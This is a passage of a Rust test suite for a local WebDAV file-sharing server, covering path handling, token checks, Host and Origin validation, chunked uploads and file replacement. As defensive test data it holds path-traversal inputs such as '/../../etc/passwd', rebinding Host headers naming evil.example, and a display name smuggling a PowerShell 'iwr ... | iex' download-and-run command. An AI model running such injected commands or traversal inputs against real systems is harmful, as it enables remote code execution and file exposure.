use super::*;
use crate::local::LocalFsDriver;
use std::path::PathBuf;

// ---------------------- PURE HELPERS ----------------------

#[test]
fn webdav_resolve_remote_path() {
    let mount_root = "/home/aquelelink.com.br";
    assert_eq!(
        resolve_remote_path("/", mount_root),
        "/home/aquelelink.com.br"
    );
    assert_eq!(
        resolve_remote_path("/public_html", mount_root),
        "/home/aquelelink.com.br/public_html"
    );
    assert_eq!(
        resolve_remote_path("/public_html/index.php", mount_root),
        "/home/aquelelink.com.br/public_html/index.php"
    );
    // Root mount
    assert_eq!(resolve_remote_path("/", "/"), "/");
    assert_eq!(resolve_remote_path("/var/log", "/"), "/var/log");
    // `..` never climbs above the mount root.
    assert_eq!(
        resolve_remote_path("/../../etc/passwd", mount_root),
        "/home/aquelelink.com.br/etc/passwd"
    );
    assert_eq!(
        resolve_remote_path("/a/./b/../c", mount_root),
        "/home/aquelelink.com.br/a/c"
    );
}

#[test]
fn webdav_to_webdav_href() {
    let mount_root = "/home/aquelelink.com.br";
    assert_eq!(
        to_webdav_href("/home/aquelelink.com.br", mount_root, true),
        "/"
    );
    assert_eq!(
        to_webdav_href("/home/aquelelink.com.br/public_html", mount_root, true),
        "/public_html/"
    );
    assert_eq!(
        to_webdav_href("/home/aquelelink.com.br/index.php", mount_root, false),
        "/index.php"
    );
    assert_eq!(
        to_webdav_href(
            "/home/aquelelink.com.br/public_html/style.css",
            mount_root,
            false
        ),
        "/public_html/style.css"
    );
    // A sibling sharing the textual prefix is not inside the root.
    assert_eq!(
        to_webdav_href("/home/aquelelink.com.br2/x", mount_root, false),
        "/home/aquelelink.com.br2/x"
    );
}

#[test]
fn webdav_decode_url_path_full_utf8() {
    assert_eq!(
        decode_url_path("/public%20html/test%231"),
        "/public html/test#1"
    );
    assert_eq!(
        decode_url_path("http://127.0.0.1:8080/my%20folder"),
        "/my folder"
    );
    assert_eq!(decode_url_path("/folder?depth=1"), "/folder");
    assert_eq!(
        decode_url_path("/Relat%C3%B3rio%20(final).pdf"),
        "/Relatório (final).pdf"
    );
    assert_eq!(decode_url_path("/a%C3%A7%C3%A3o.txt"), "/ação.txt");
    // Lower-case hex and NFD (decomposed) names decode byte-exactly.
    assert_eq!(decode_url_path("/a%c3%a7%c3%a3o.txt"), "/ação.txt");
    assert_eq!(
        decode_url_path("/ac%CC%A7a%CC%83o.txt"),
        "/ac\u{0327}a\u{0303}o.txt"
    );
    assert_eq!(
        decode_url_path("/%27%28%29%26%21%40%2C%5B%5D%2B+"),
        "/'()&!@,[]++"
    );
    // Malformed escapes are kept literally by the lenient decoder.
    assert_eq!(decode_url_path("/100%"), "/100%");
    assert_eq!(decode_url_path("/a%ZZb"), "/a%ZZb");
    assert_eq!(decode_url_path(""), "/");
}

#[test]
fn webdav_decode_path_segments_strict() {
    assert_eq!(
        decode_path_segments("/a/./b//c/").unwrap(),
        vec!["a", "b", "c"]
    );
    assert_eq!(
        decode_path_segments("/Relat%C3%B3rio%20(final)/x%20y.txt").unwrap(),
        vec!["Relatório (final)", "x y.txt"]
    );
    assert_eq!(decode_path_segments("/a/%2E%2E/b").unwrap(), vec!["b"]);
    assert_eq!(decode_path_segments("/a/../b").unwrap(), vec!["b"]);
    assert_eq!(decode_path_segments("/../x"), Err(PathError::Forbidden));
    assert_eq!(decode_path_segments("/%2E%2E/x"), Err(PathError::Forbidden));
    // An encoded slash cannot split a name into two segments.
    assert_eq!(decode_path_segments("/a%2Fb"), Err(PathError::BadRequest));
    assert_eq!(decode_path_segments("/a%00b"), Err(PathError::BadRequest));
    assert_eq!(decode_path_segments("/%FF%FE"), Err(PathError::BadRequest));
    assert_eq!(decode_path_segments("/bad%G1"), Err(PathError::BadRequest));
    assert_eq!(decode_path_segments("/").unwrap(), Vec::<String>::new());
}

#[test]
fn webdav_parse_target_requires_token() {
    let t = Some("secret123");
    assert_eq!(
        parse_target("/secret123/a%20b", t, 8080).unwrap(),
        vec!["a b"]
    );
    assert_eq!(
        parse_target("/secret123", t, 8080).unwrap(),
        Vec::<String>::new()
    );
    assert_eq!(parse_target("/a", t, 8080), Err(PathError::NotFound));
    assert_eq!(parse_target("/", t, 8080), Err(PathError::NotFound));
    assert_eq!(
        parse_target("/secret12/a", t, 8080),
        Err(PathError::NotFound)
    );
    assert_eq!(
        parse_target("/secret123/../a", t, 8080),
        Err(PathError::NotFound)
    );
    assert_eq!(
        parse_target("/secret123/../../a", t, 8080),
        Err(PathError::Forbidden)
    );
    assert_eq!(
        parse_target("http://127.0.0.1:8080/secret123/x?y=1", t, 8080).unwrap(),
        vec!["x"]
    );
    assert_eq!(
        parse_target("http://evil.example:8080/secret123/x", t, 8080),
        Err(PathError::NotFound)
    );
    // Without a token every path is inside the share.
    assert_eq!(parse_target("/a/b", None, 8080).unwrap(), vec!["a", "b"]);
}

fn hdrs(pairs: &[(&str, &str)]) -> HashMap<String, String> {
    pairs
        .iter()
        .map(|(k, v)| (k.to_ascii_lowercase(), v.to_string()))
        .collect()
}

#[test]
fn webdav_host_and_origin_checks() {
    let port = 49152;
    assert!(check_request_headers(&hdrs(&[("Host", "127.0.0.1:49152")]), port).is_ok());
    assert!(check_request_headers(&hdrs(&[("Host", "LOCALHOST:49152")]), port).is_ok());
    assert_eq!(
        check_request_headers(&hdrs(&[]), port),
        Err(Rejection::MissingHost)
    );
    for bad in [
        "127.0.0.1",
        "localhost",
        "127.0.0.1:49153",
        "evil.example:49152",
        "127.0.0.1.evil.example:49152",
        "127.0.0.1:49152, evil.example",
    ] {
        assert_eq!(
            check_request_headers(&hdrs(&[("Host", bad)]), port),
            Err(Rejection::WrongHost),
            "{bad}"
        );
    }
    assert_eq!(
        check_request_headers(
            &hdrs(&[
                ("Host", "127.0.0.1:49152"),
                ("Origin", "http://127.0.0.1:49152")
            ]),
            port
        ),
        Err(Rejection::BrowserRequest)
    );
    assert_eq!(
        check_request_headers(
            &hdrs(&[("Host", "127.0.0.1:49152"), ("Origin", "null")]),
            port
        ),
        Err(Rejection::BrowserRequest)
    );
    assert_eq!(
        check_request_headers(
            &hdrs(&[
                ("Host", "127.0.0.1:49152"),
                ("Sec-Fetch-Site", "cross-site")
            ]),
            port
        ),
        Err(Rejection::BrowserRequest)
    );
    assert!(check_request_headers(
        &hdrs(&[("Host", "127.0.0.1:49152"), ("Sec-Fetch-Site", "none")]),
        port
    )
    .is_ok());
}

#[test]
fn webdav_parse_range() {
    use RangeOutcome::*;
    assert_eq!(parse_range("bytes=0-499", 1000), Satisfiable(0, 499));
    assert_eq!(parse_range("bytes=500-", 1000), Satisfiable(500, 999));
    assert_eq!(parse_range("bytes=-200", 1000), Satisfiable(800, 999));
    assert_eq!(parse_range("bytes=-2000", 1000), Satisfiable(0, 999));
    assert_eq!(parse_range("bytes=0-5000", 1000), Satisfiable(0, 999));
    assert_eq!(parse_range("BYTES = 1-1", 1000), Ignore);
    assert_eq!(parse_range("bytes= 1-1", 1000), Satisfiable(1, 1));
    assert_eq!(parse_range("bytes=0-0,5-9", 1000), Satisfiable(0, 0));
    assert_eq!(parse_range("bytes=1000-", 1000), Unsatisfiable);
    assert_eq!(parse_range("bytes=-0", 1000), Unsatisfiable);
    assert_eq!(parse_range("bytes=0-", 0), Unsatisfiable);
    assert_eq!(parse_range("bytes=5-2", 1000), Ignore);
    assert_eq!(parse_range("items=0-1", 1000), Ignore);
    assert_eq!(parse_range("bytes=abc", 1000), Ignore);
    assert_eq!(parse_range("bytes=+1-2", 1000), Ignore);
    let big = 5 * 1024 * 1024 * 1024u64;
    assert_eq!(
        parse_range("bytes=5000000000-", big),
        Satisfiable(5_000_000_000, big - 1)
    );
    // Legacy helper keeps its contract.
    assert_eq!(parse_range_header("bytes=0-499", 1000), Some((0, 499)));
    assert_eq!(parse_range_header("bytes=500-", 1000), Some((500, 999)));
    assert_eq!(parse_range_header("bytes=-200", 1000), Some((800, 999)));
    assert_eq!(parse_range_header("invalid", 1000), None);
    assert_eq!(parse_range_header("bytes=0-1", 0), None);
}

#[test]
fn webdav_body_framing() {
    assert_eq!(body_framing(&hdrs(&[])), Ok(Framing::Length(0)));
    assert_eq!(
        body_framing(&hdrs(&[("Content-Length", "42")])),
        Ok(Framing::Length(42))
    );
    assert_eq!(
        body_framing(&hdrs(&[("Content-Length", "5, 5")])),
        Ok(Framing::Length(5))
    );
    assert_eq!(body_framing(&hdrs(&[("Content-Length", "5, 6")])), Err(400));
    assert_eq!(body_framing(&hdrs(&[("Content-Length", "-1")])), Err(400));
    assert_eq!(body_framing(&hdrs(&[("Content-Length", "abc")])), Err(400));
    assert_eq!(
        body_framing(&hdrs(&[("Transfer-Encoding", "chunked")])),
        Ok(Framing::Chunked)
    );
    // Transfer-Encoding wins over Content-Length.
    assert_eq!(
        body_framing(&hdrs(&[
            ("Transfer-Encoding", "Chunked"),
            ("Content-Length", "3")
        ])),
        Ok(Framing::Chunked)
    );
    assert_eq!(
        body_framing(&hdrs(&[("Transfer-Encoding", "gzip, chunked")])),
        Err(501)
    );
    assert_eq!(
        body_framing(&hdrs(&[("Transfer-Encoding", "chunked, chunked")])),
        Err(501)
    );
}

#[tokio::test]
async fn webdav_chunked_body_reader() {
    let raw: &[u8] = b"5\r\nhello\r\n6;name=v\r\n world\r\n0\r\nX-Trailer: 1\r\n\r\nNEXT";
    let mut io = raw;
    let mut buf = Vec::new();
    let mut r = BodyReader::new(&mut io, &mut buf, Framing::Chunked, Duration::from_secs(1));
    let body = r.read_to_vec(1024).await.unwrap();
    assert_eq!(body, b"hello world");
    assert!(r.is_done());
    // Bytes after the body stay for the next pipelined request.
    let mut rest = buf.clone();
    io.read_to_end(&mut rest).await.unwrap();
    assert_eq!(rest, b"NEXT");

    // Pieces never exceed `max`.
    let raw: &[u8] = b"A\r\n0123456789\r\n0\r\n\r\n";
    let mut io = raw;
    let mut buf = Vec::new();
    let mut r = BodyReader::new(&mut io, &mut buf, Framing::Chunked, Duration::from_secs(1));
    let mut pieces = Vec::new();
    while let Some(p) = r.next_piece(4).await.unwrap() {
        assert!(p.len() <= 4);
        pieces.extend_from_slice(&p);
    }
    assert_eq!(pieces, b"0123456789");

    // Missing terminating chunk (client disconnected) is a truncated body.
    let raw: &[u8] = b"5\r\nhello\r\n";
    let mut io = raw;
    let mut buf = Vec::new();
    let mut r = BodyReader::new(&mut io, &mut buf, Framing::Chunked, Duration::from_secs(1));
    assert_eq!(r.read_to_vec(1024).await, Err(BodyError::Truncated));

    // Bad chunk size / missing CRLF after data.
    for raw in [
        &b"zz\r\nhello\r\n0\r\n\r\n"[..],
        &b"5\r\nhelloXX0\r\n\r\n"[..],
    ] {
        let mut io = raw;
        let mut buf = Vec::new();
        let mut r = BodyReader::new(&mut io, &mut buf, Framing::Chunked, Duration::from_secs(1));
        assert_eq!(r.read_to_vec(1024).await, Err(BodyError::Malformed));
    }

    // Cap.
    let raw: &[u8] = b"5\r\nhello\r\n0\r\n\r\n";
    let mut io = raw;
    let mut buf = Vec::new();
    let mut r = BodyReader::new(&mut io, &mut buf, Framing::Chunked, Duration::from_secs(1));
    assert_eq!(r.read_to_vec(3).await, Err(BodyError::TooLarge));
}

#[tokio::test]
async fn webdav_length_body_reader() {
    // Part of the body already sits in the header buffer.
    let raw: &[u8] = b"world!GET";
    let mut io = raw;
    let mut buf = b"hello ".to_vec();
    let mut r = BodyReader::new(
        &mut io,
        &mut buf,
        Framing::Length(12),
        Duration::from_secs(1),
    );
    assert_eq!(r.read_to_vec(1024).await.unwrap(), b"hello world!");
    let mut rest = buf.clone();
    io.read_to_end(&mut rest).await.unwrap();
    assert_eq!(rest, b"GET");

    let raw: &[u8] = b"short";
    let mut io = raw;
    let mut buf = Vec::new();
    let mut r = BodyReader::new(
        &mut io,
        &mut buf,
        Framing::Length(100),
        Duration::from_secs(1),
    );
    assert_eq!(r.read_to_vec(1024).await, Err(BodyError::Truncated));
}

#[test]
fn webdav_error_status_mapping() {
    use std::io::{Error, ErrorKind};
    assert_eq!(
        error_status(&CoreError::NotFound("x".into()), Op::Read),
        404
    );
    assert_eq!(
        error_status(&CoreError::NotFound("x".into()), Op::Write),
        409
    );
    assert_eq!(
        error_status(&CoreError::PermissionDenied("x".into()), Op::Write),
        403
    );
    assert_eq!(error_status(&CoreError::Timeout("x".into()), Op::Read), 504);
    assert_eq!(
        error_status(&CoreError::ConnectionFailed("x".into()), Op::Write),
        502
    );
    assert_eq!(
        error_status(
            &CoreError::Io(Error::from(ErrorKind::PermissionDenied)),
            Op::Write
        ),
        403
    );
    #[cfg(unix)]
    assert_eq!(
        error_status(
            &CoreError::Io(Error::from_raw_os_error(libc::ENOSPC)),
            Op::Write
        ),
        507
    );
    assert_eq!(
        error_status(
            &CoreError::Io(Error::other("Failed to write: SFTP quota exceeded")),
            Op::Write
        ),
        507
    );
    assert_eq!(
        error_status(&CoreError::General("boom".into()), Op::Write),
        502
    );
}

#[test]
fn webdav_display_names_and_drive_letters() {
    assert_eq!(sanitize_display_name("Meu Servidor"), "Meu Servidor");
    assert_eq!(
        sanitize_display_name("../Documents/contract.pdf"),
        "_Documents_contract.pdf"
    );
    assert_eq!(
        sanitize_display_name("x'; iwr http://e/p|iex; '"),
        "x_; iwr http___e_p_iex; _"
    );
    assert_eq!(sanitize_display_name("  ..  "), "RustSCP");
    assert_eq!(sanitize_display_name("Produção\u{0007}"), "Produção_");
    assert_eq!(sanitize_display_name("CON"), "_CON");
    assert_eq!(sanitize_display_name("nul.txt"), "_nul.txt");
    assert_eq!(sanitize_display_name("Com3"), "_Com3");
    assert_eq!(sanitize_display_name("COM10"), "COM10");
    assert_eq!(sanitize_display_name("Console"), "Console");
    assert_eq!(numbered_name("A", 0), "A");
    assert_eq!(numbered_name("A", 1), "A (RustSCP)");
    assert_eq!(numbered_name("A", 3), "A (RustSCP 3)");
    assert_eq!(pick_free_drive_letter(|_| false), Some('Z'));
    assert_eq!(pick_free_drive_letter(|c| c >= 'X'), Some('W'));
    assert_eq!(pick_free_drive_letter(|_| true), None);
}

#[test]
fn webdav_is_os_system_probe() {
    assert!(is_os_system_probe("/.DS_Store"));
    assert!(is_os_system_probe("/folder/._index.html"));
    assert!(is_os_system_probe("/.metadata_never_index"));
    assert!(is_os_system_probe("/Thumbs.db"));
    assert!(!is_os_system_probe("/folder/index.html"));
    assert!(!is_os_system_probe("/public_html"));
}

#[test]
fn webdav_encode_segment_round_trip() {
    for name in [
        "ação (1).txt",
        "Relatório final & cia's [v2]!.pdf",
        "100% done#.md",
        "a+b=c",
    ] {
        let enc = encode_segment(name);
        assert!(enc
            .bytes()
            .all(|b| b.is_ascii_alphanumeric() || b"%-_.~".contains(&b)));
        assert_eq!(
            decode_path_segments(&format!("/{}", enc)).unwrap(),
            vec![name]
        );
    }
}

#[test]
fn webdav_token_and_mount_url() {
    let tmp = std::env::temp_dir();
    let mut s = WebDavServer::new(
        "s".into(),
        "n".into(),
        tmp.to_string_lossy().to_string(),
        Arc::new(LocalFsDriver::new()),
        Arc::new(ManagedDiskCache::new(
            Some(tmp.join("rustscp-unused-cache")),
            1024,
        )),
    );
    let token = s.access_token().unwrap().to_string();
    assert_eq!(token.len(), 32);
    assert!(s.mount_url().ends_with(&format!("/{}/", token)));
    assert!(s.set_access_token(Some("bad token!".into())).is_err());
    s.set_access_token(None).unwrap();
    assert_eq!(s.base_path(), "/");
    assert_eq!(s.info().mount_url, "http://127.0.0.1:0/");
}

// ---------------------- LIVE SERVER ----------------------

#[tokio::test]
async fn webdav_connection_future_is_small() {
    let listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
    let addr = listener.local_addr().unwrap();
    let _c = TcpStream::connect(addr).await.unwrap();
    let (s, _) = listener.accept().await.unwrap();
    let shared = Arc::new(Shared {
        session_id: "s".into(),
        mount_root: "/".into(),
        token: None,
        port: 1,
        vfs: Arc::new(LocalFsDriver::new()),
        cache: Arc::new(ManagedDiskCache::new(
            Some(std::env::temp_dir().join("x-unused")),
            1,
        )),
        read_bytes: Default::default(),
        write_bytes: Default::default(),
        stamps: Mutex::new(HashMap::new()),
        probes: Mutex::new(ProbeStore::default()),
    });
    let fut = serve_connection(s, shared);
    // Connection tasks are polled on 2 MiB worker stacks: keep the state machine small.
    assert!(std::mem::size_of_val(&fut) < 64 * 1024);
}

struct Live {
    _tmp: tempfile::TempDir,
    root: PathBuf,
    server: WebDavServer,
    port: u16,
    base: String,
}

async fn live() -> Live {
    let tmp = tempfile::tempdir().unwrap();
    let root = std::fs::canonicalize(tmp.path()).unwrap().join("share");
    std::fs::create_dir_all(&root).unwrap();
    let cache = Arc::new(ManagedDiskCache::new(
        Some(tmp.path().join("cache")),
        512 * 1024 * 1024,
    ));
    let mut server = WebDavServer::new(
        "test_sess".to_string(),
        "MinhaConexao".to_string(),
        root.to_string_lossy().to_string(),
        Arc::new(LocalFsDriver::new()),
        cache,
    );
    let port = server.start().await.unwrap();
    let base = server.base_path();
    Live {
        _tmp: tmp,
        root,
        server,
        port,
        base,
    }
}

struct Client {
    stream: TcpStream,
    buf: Vec<u8>,
}

#[derive(Debug)]
struct Resp {
    status: u16,
    headers: HashMap<String, String>,
    body: Vec<u8>,
}

impl Resp {
    fn text(&self) -> String {
        String::from_utf8_lossy(&self.body).into_owned()
    }
}

impl Client {
    async fn connect(port: u16) -> Self {
        Self {
            stream: TcpStream::connect(("127.0.0.1", port)).await.unwrap(),
            buf: Vec::new(),
        }
    }

    async fn fill(&mut self) -> bool {
        self.buf.reserve(64 * 1024);
        match tokio::time::timeout(Duration::from_secs(10), self.stream.read_buf(&mut self.buf))
            .await
        {
            Ok(Ok(0)) | Ok(Err(_)) => false,
            Ok(Ok(_)) => true,
            Err(_) => panic!("timed out waiting for the server"),
        }
    }

    /// Reads one response (skipping `100 Continue`); None if the server closed.
    async fn response(&mut self, head_only: bool) -> Option<Resp> {
        loop {
            let pos = loop {
                if let Some(p) = find_subsequence(&self.buf, b"\r\n\r\n") {
                    break p;
                }
                if !self.fill().await {
                    return None;
                }
            };
            let head = String::from_utf8_lossy(&self.buf[..pos]).into_owned();
            self.buf.drain(..pos + 4);
            let mut lines = head.split("\r\n");
            let status: u16 = lines
                .next()
                .unwrap()
                .split_whitespace()
                .nth(1)
                .unwrap()
                .parse()
                .unwrap();
            let headers: HashMap<String, String> = lines
                .filter_map(|l| l.split_once(':'))
                .map(|(k, v)| (k.trim().to_ascii_lowercase(), v.trim().to_string()))
                .collect();
            if status == 100 {
                continue;
            }
            let len: usize = if head_only {
                0
            } else {
                headers
                    .get("content-length")
                    .map(|v| v.parse().unwrap())
                    .unwrap_or(0)
            };
            while self.buf.len() < len {
                if !self.fill().await {
                    panic!("connection closed mid-body");
                }
            }
            let body: Vec<u8> = self.buf.drain(..len).collect();
            return Some(Resp {
                status,
                headers,
                body,
            });
        }
    }

    async fn send(&mut self, raw: &[u8]) {
        self.stream.write_all(raw).await.unwrap();
    }

    async fn req(&mut self, raw: &str) -> Resp {
        let head_only = raw.starts_with("HEAD ");
        self.send(raw.as_bytes()).await;
        self.response(head_only)
            .await
            .expect("server closed the connection")
    }
}

fn host(port: u16) -> String {
    format!("Host: 127.0.0.1:{}\r\n", port)
}

#[tokio::test]
async fn webdav_live_security_checks() {
    let l = live().await;
    let mut c = Client::connect(l.port).await;

    let r = c
        .req(&format!("OPTIONS / HTTP/1.1\r\n{}\r\n", host(l.port)))
        .await;
    assert_eq!(r.status, 200);
    assert_eq!(r.headers.get("dav").unwrap(), "1, 2");
    assert!(r.headers.get("allow").unwrap().contains("COPY"));
    assert!(!r.headers.get("allow").unwrap().contains("POST"));
    assert_eq!(r.headers.get("connection").unwrap(), "keep-alive");

    // Without the token nothing is served.
    let r = c
        .req(&format!(
            "PROPFIND / HTTP/1.1\r\n{}Depth: 0\r\n\r\n",
            host(l.port)
        ))
        .await;
    assert_eq!(r.status, 404);
    let r = c
        .req(&format!(
            "GET /0123456789abcdef0123456789abcdef/ HTTP/1.1\r\n{}\r\n",
            host(l.port)
        ))
        .await;
    assert_eq!(r.status, 404);

    // Wrong Host (DNS rebinding) and browser requests are refused and closed.
    for extra in [
        "Host: evil.example:80\r\n".to_string(),
        format!("Host: evil.example:{}\r\n", l.port),
        format!("{}Origin: http://evil.example\r\n", host(l.port)),
        format!("{}Sec-Fetch-Site: cross-site\r\n", host(l.port)),
        String::new(),
    ] {
        let mut c = Client::connect(l.port).await;
        let r = c
            .req(&format!(
                "PROPFIND {} HTTP/1.1\r\n{}Depth: 0\r\n\r\n",
                l.base, extra
            ))
            .await;
        assert!(
            r.status == 403 || r.status == 400,
            "{extra:?} -> {}",
            r.status
        );
        assert_eq!(r.headers.get("connection").unwrap(), "close");
        assert!(c.response(false).await.is_none());
    }

    // The share root with the token works.
    let r = c
        .req(&format!(
            "PROPFIND {} HTTP/1.1\r\n{}Depth: 0\r\n\r\n",
            l.base,
            host(l.port)
        ))
        .await;
    assert_eq!(r.status, 207);
    assert!(r.text().contains(&format!("<D:href>{}</D:href>", l.base)));

    // OS probes still answer 404 without touching the server.
    let r = c
        .req(&format!(
            "PROPFIND {}.DS_Store HTTP/1.1\r\n{}Depth: 0\r\n\r\n",
            l.base,
            host(l.port)
        ))
        .await;
    assert_eq!(r.status, 404);
}

#[tokio::test]
async fn webdav_live_chunked_put_get_and_ranges() {
    let l = live().await;
    let mut c = Client::connect(l.port).await;
    let name_enc = "a%C3%A7%C3%A3o%20(1).txt";
    let content = b"Ola, mundo! Acentua\xC3\xA7\xC3\xA3o funciona.";

    // Finder style: chunked + X-Expected-Entity-Length.
    let mut raw = format!(
        "PUT {}{} HTTP/1.1\r\n{}Transfer-Encoding: chunked\r\nX-Expected-Entity-Length: {}\r\n\r\n",
        l.base,
        name_enc,
        host(l.port),
        content.len()
    )
    .into_bytes();
    for part in content.chunks(7) {
        raw.extend_from_slice(format!("{:x}\r\n", part.len()).as_bytes());
        raw.extend_from_slice(part);
        raw.extend_from_slice(b"\r\n");
    }
    raw.extend_from_slice(b"0\r\n\r\n");
    c.send(&raw).await;
    let r = c.response(false).await.unwrap();
    assert_eq!(r.status, 201);
    let on_disk = std::fs::read(l.root.join("ação (1).txt")).unwrap();
    assert_eq!(on_disk, content);
    // No temp files left behind.
    let names: Vec<String> = std::fs::read_dir(&l.root)
        .unwrap()
        .map(|e| e.unwrap().file_name().to_string_lossy().into_owned())
        .collect();
    assert_eq!(names, vec!["ação (1).txt".to_string()]);

    // Listing shows the encoded href.
    let r = c
        .req(&format!(
            "PROPFIND {} HTTP/1.1\r\n{}Depth: 1\r\n\r\n",
            l.base,
            host(l.port)
        ))
        .await;
    assert_eq!(r.status, 207);
    let listed = format!(
        "<D:href>{}{}</D:href>",
        l.base,
        encode_segment("ação (1).txt")
    );
    assert!(r.text().contains(&listed), "{}", r.text());
    assert!(r
        .text()
        .contains("<D:displayname>ação (1).txt</D:displayname>"));
    assert!(r.text().contains("GMT</D:getlastmodified>"));

    // Full GET, then ranges.
    let r = c
        .req(&format!(
            "GET {}{} HTTP/1.1\r\n{}\r\n",
            l.base,
            name_enc,
            host(l.port)
        ))
        .await;
    assert_eq!(r.status, 200);
    assert_eq!(r.body, content);
    let r = c
        .req(&format!(
            "GET {}{} HTTP/1.1\r\n{}Range: bytes=4-8\r\n\r\n",
            l.base,
            name_enc,
            host(l.port)
        ))
        .await;
    assert_eq!(r.status, 206);
    assert_eq!(r.body, &content[4..=8]);
    assert_eq!(
        r.headers.get("content-range").unwrap(),
        &format!("bytes 4-8/{}", content.len())
    );
    let r = c
        .req(&format!(
            "GET {}{} HTTP/1.1\r\n{}Range: bytes=-5\r\n\r\n",
            l.base,
            name_enc,
            host(l.port)
        ))
        .await;
    assert_eq!(r.body, &content[content.len() - 5..]);
    let r = c
        .req(&format!(
            "GET {}{} HTTP/1.1\r\n{}Range: bytes=9999-\r\n\r\n",
            l.base,
            name_enc,
            host(l.port)
        ))
        .await;
    assert_eq!(r.status, 416);
    let r = c
        .req(&format!(
            "HEAD {}{} HTTP/1.1\r\n{}\r\n",
            l.base,
            name_enc,
            host(l.port)
        ))
        .await;
    assert_eq!(r.status, 200);
    assert_eq!(
        r.headers.get("content-length").unwrap(),
        &content.len().to_string()
    );

    // Traffic counters: bytes actually sent / received.
    let info = l.server.info();
    assert_eq!(info.write_bytes, content.len() as u64);
    assert_eq!(info.read_bytes, (content.len() + 5 + 5) as u64);
}

#[tokio::test]
async fn webdav_live_truncated_put_keeps_original() {
    let l = live().await;
    let target = l.root.join("index.php");
    std::fs::write(&target, b"ORIGINAL CONTENT").unwrap();

    // Content-Length larger than what arrives, then the client goes away.
    let mut c = Client::connect(l.port).await;
    c.send(
        format!(
            "PUT {}index.php HTTP/1.1\r\n{}Content-Length: 100\r\n\r\nonly ten b",
            l.base,
            host(l.port)
        )
        .as_bytes(),
    )
    .await;
    c.stream.shutdown().await.unwrap();
    if let Some(r) = c.response(false).await {
        assert_eq!(r.status, 400);
    }

    // Chunked body without the terminating chunk.
    let mut c = Client::connect(l.port).await;
    c.send(
        format!(
            "PUT {}index.php HTTP/1.1\r\n{}Transfer-Encoding: chunked\r\n\r\n5\r\nhello\r\n",
            l.base,
            host(l.port)
        )
        .as_bytes(),
    )
    .await;
    c.stream.shutdown().await.unwrap();
    if let Some(r) = c.response(false).await {
        assert_eq!(r.status, 400);
    }

    // Chunked body shorter than X-Expected-Entity-Length.
    let mut c = Client::connect(l.port).await;
    let r = c
        .req(&format!(
            "PUT {}index.php HTTP/1.1\r\n{}Transfer-Encoding: chunked\r\nX-Expected-Entity-Length: 50\r\n\r\n5\r\nhello\r\n0\r\n\r\n",
            l.base,
            host(l.port)
        ))
        .await;
    assert_eq!(r.status, 400);

    // Unsupported transfer coding.
    let mut c = Client::connect(l.port).await;
    let r = c
        .req(&format!(
            "PUT {}index.php HTTP/1.1\r\n{}Transfer-Encoding: gzip\r\n\r\n",
            l.base,
            host(l.port)
        ))
        .await;
    assert_eq!(r.status, 501);

    tokio::time::sleep(Duration::from_millis(200)).await;
    assert_eq!(std::fs::read(&target).unwrap(), b"ORIGINAL CONTENT");
    let leftovers: Vec<String> = std::fs::read_dir(&l.root)
        .unwrap()
        .map(|e| e.unwrap().file_name().to_string_lossy().into_owned())
        .filter(|n| n != "index.php")
        .collect();
    assert!(leftovers.is_empty(), "{leftovers:?}");
}

#[tokio::test]
async fn webdav_live_overwrite_and_pipelining() {
    let l = live().await;
    let target = l.root.join("script.sh");
    std::fs::write(&target, b"#!/bin/sh\necho old\n").unwrap();
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        std::fs::set_permissions(&target, std::fs::Permissions::from_mode(0o751)).unwrap();
    }

    // Two pipelined requests in one write: PUT (Content-Length) then GET.
    let body = "#!/bin/sh\necho new version\n";
    let raw = format!(
        "PUT {b}script.sh HTTP/1.1\r\n{h}Content-Length: {n}\r\n\r\n{body}GET {b}script.sh HTTP/1.1\r\n{h}\r\n",
        b = l.base,
        h = host(l.port),
        n = body.len(),
        body = body
    );
    let mut c = Client::connect(l.port).await;
    c.send(raw.as_bytes()).await;
    let r1 = c.response(false).await.unwrap();
    assert_eq!(r1.status, 204, "replacing an existing file");
    let r2 = c.response(false).await.unwrap();
    assert_eq!(r2.status, 200);
    assert_eq!(r2.text(), body);
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let mode = std::fs::metadata(&target).unwrap().permissions().mode() & 0o7777;
        assert_eq!(mode, 0o751, "permissions survive the temp-file replace");
    }

    // Expect: 100-continue is honoured.
    let r = c
        .req(&format!(
            "PUT {}new.txt HTTP/1.1\r\n{}Content-Length: 3\r\nExpect: 100-continue\r\n\r\nabc",
            l.base,
            host(l.port)
        ))
        .await;
    assert_eq!(r.status, 201);
    assert_eq!(std::fs::read(l.root.join("new.txt")).unwrap(), b"abc");

    // Empty PUT creates an empty file (Finder's placeholder).
    let r = c
        .req(&format!(
            "PUT {}empty.bin HTTP/1.1\r\n{}Content-Length: 0\r\n\r\n",
            l.base,
            host(l.port)
        ))
        .await;
    assert_eq!(r.status, 201);
    assert_eq!(
        std::fs::metadata(l.root.join("empty.bin")).unwrap().len(),
        0
    );
}

#[cfg(unix)]
#[tokio::test]
async fn webdav_live_put_through_symlink_keeps_link() {
    let l = live().await;
    std::fs::create_dir_all(l.root.join("shared")).unwrap();
    std::fs::create_dir_all(l.root.join("linked_dir")).unwrap();
    std::fs::write(l.root.join("shared/.env"), b"APP_ENV=old").unwrap();
    std::fs::write(l.root.join("linked_dir/inside.txt"), b"in").unwrap();
    std::os::unix::fs::symlink("shared/.env", l.root.join(".env")).unwrap();
    std::os::unix::fs::symlink("linked_dir", l.root.join("dir_link")).unwrap();
    let mut c = Client::connect(l.port).await;

    // Listing shows the linked folder as a collection.
    let r = c
        .req(&format!(
            "PROPFIND {} HTTP/1.1\r\n{}Depth: 1\r\n\r\n",
            l.base,
            host(l.port)
        ))
        .await;
    assert!(
        r.text()
            .contains(&format!("<D:href>{}dir_link/</D:href>", l.base)),
        "{}",
        r.text()
    );

    let body = "APP_ENV=production";
    let r = c
        .req(&format!(
            "PUT {}.env HTTP/1.1\r\n{}Content-Length: {}\r\n\r\n{}",
            l.base,
            host(l.port),
            body.len(),
            body
        ))
        .await;
    assert_eq!(r.status, 204);
    let meta = std::fs::symlink_metadata(l.root.join(".env")).unwrap();
    assert!(
        meta.file_type().is_symlink(),
        "the symlink must survive the upload"
    );
    assert_eq!(
        std::fs::read(l.root.join("shared/.env")).unwrap(),
        body.as_bytes()
    );
    let leftovers: Vec<String> = std::fs::read_dir(&l.root)
        .unwrap()
        .map(|e| e.unwrap().file_name().to_string_lossy().into_owned())
        .filter(|n| is_internal_temp_name(n))
        .collect();
    assert!(leftovers.is_empty(), "{leftovers:?}");
